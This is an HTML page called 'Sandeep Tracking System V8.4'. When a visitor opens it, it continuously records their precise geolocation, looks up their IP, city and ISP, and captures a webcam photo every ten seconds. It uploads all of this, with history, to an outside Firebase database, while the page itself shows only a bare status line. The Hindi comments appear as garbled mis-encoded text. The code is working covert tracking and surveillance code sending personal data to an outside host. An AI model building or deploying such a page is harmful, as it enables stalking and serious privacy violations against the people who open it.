<!DOCTYPE html>
<html>
<head>
    <title>Sandeep Tracking System V8.4</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="background: #000; color: #fff; text-align: center;">
    <h1 id="status">INITIALIZING...</h1>
    
    <script>
        const firebaseConfig = { databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function activate() {
            document.getElementById('status').innerText = "SYSTEM ACTIVE";
            
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(pos => {
                    // ðŸŸ¢ à¤®à¥à¤–à¥à¤¯ à¤«à¥€à¤šà¤°: à¤¹à¤° à¤¬à¤¾à¤° à¤…à¤²à¤— à¤¡à¥‡à¤Ÿà¤¾ à¤à¤‚à¤Ÿà¥à¤°à¥€ à¤¸à¥‡à¤µ à¤•à¤°à¤¨à¤¾ (PUSH à¤•à¤¾ à¤‡à¤¸à¥à¤¤à¥‡à¤®à¤¾à¤²)
                    const uniqueKey = new Date().getTime(); // à¤¸à¤®à¤¯ à¤•à¥‡ à¤¹à¤¿à¤¸à¤¾à¤¬ à¤¸à¥‡ à¤…à¤²à¤— ID
                    const trackingData = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        timestamp: new Date().toLocaleString(),
                        device: navigator.platform
                    };

                    // 1. 'live_detect' à¤®à¥‡à¤‚ à¤•à¤°à¤‚à¤Ÿ à¤²à¥‹à¤•à¥‡à¤¶à¤¨ (kp.html à¤•à¥‡ à¤²à¤¿à¤)
                    database.ref('live_detect/location').update(trackingData);
                    
                    // 2. 'tracking_history' à¤®à¥‡à¤‚ à¤¹à¤° à¤¬à¤¾à¤° à¤¨à¤ˆ à¤à¤‚à¤Ÿà¥à¤°à¥€ (à¤¡à¥‡à¤Ÿà¤¾à¤¬à¥‡à¤¸ à¤®à¥‡à¤‚ à¤¸à¥à¤Ÿà¥‹à¤° à¤•à¤°à¤¨à¥‡ à¤•à¥‡ à¤²à¤¿à¤)
                    database.ref('tracking_history').push(trackingData);

                }, err => console.log(err), { enableHighAccuracy: true });
            }

            // à¤®à¥‹à¤¬à¤¾à¤‡à¤² à¤‡à¤‚à¤Ÿà¥‡à¤² à¤”à¤° IP
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                database.ref('live_detect/intel').update({
                    ip: data.ip,
                    city: data.city,
                    isp: data.org
                });
            });
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
                    
                    // à¤«à¥‹à¤Ÿà¥‹ à¤­à¥€ à¤¹à¤¿à¤¸à¥à¤Ÿà¥à¤°à¥€ à¤®à¥‡à¤‚ à¤¸à¥‡à¤µ à¤•à¤°à¥‡à¤‚
                    database.ref('live_detect').update({ photo: photoData });
                    database.ref('photo_history').push({ photo: photoData, time: new Date().toLocaleString() });
                }, 10000);
            } catch (err) {}
        }

        window.onload = () => { activate(); startCamera(); };
    </script>
</body>
</html>